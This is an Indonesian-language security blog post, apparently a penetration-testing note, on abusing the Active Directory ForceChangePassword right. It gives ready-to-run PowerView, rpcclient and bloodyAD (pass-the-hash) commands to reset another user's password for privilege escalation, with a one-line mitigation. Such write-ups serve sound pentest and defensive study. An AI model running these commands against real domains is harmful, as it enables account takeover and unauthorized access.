---
title: '[ACL] ForceChangePassword Abuse'
date: 2022-04-8 08:25:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, writeowner, privilege escalation, lateral movement, powerview]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

User yang memiliki hak akses `ForceChangePassword` memiliki kemampuan untuk mengubah kata sandi object (user) terkait tanpa harus mengetahui password yang digunakan saat ini.

---

### Tujuan 

- *Privilege escalation* atau
- *lateral movement*

### Prasyarat

- User dengan hak akses `ForceChangePassword` terhadap user lain

### Tools

- Powershell / CMD
- PowerView

---

## Tahapan eksploitasi

### Step 1: Cek Hak Akses Dengan BloodHound

Pada kasus ini, user **Support** memiliki hak akses `ForceChangePassword` terhadap user **Audit2020**.

![bloodhound forcechangepassword](/assets/img/posts/forcechangepassword-abuse/1.png)

### Step 2: Merubah Password Object Lain

#### On Windows

```powershell
PS> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS> . .\PowerView.ps1
PS> Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

#### On Linux (Remote)

```bash
# Using rpcclient from the  Samba software suite
➜ rpcclient -U '<attacker_user>%<my_password>' -W <DOMAIN> -c "setuserinfo2 <target_user> 23 <target_newpwd>" 

# Using bloodyAD with pass-the-hash
➜ bloodyAD.py --host [DC IP] -d DOMAIN -u <attacker_user> -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword <target_user> <target_newpwd>
```

## Mitigasi

Perhatikan kembali pemberian hak akses `ForceChangePassword`.

---

## Referensi

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#forcechangepassword
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces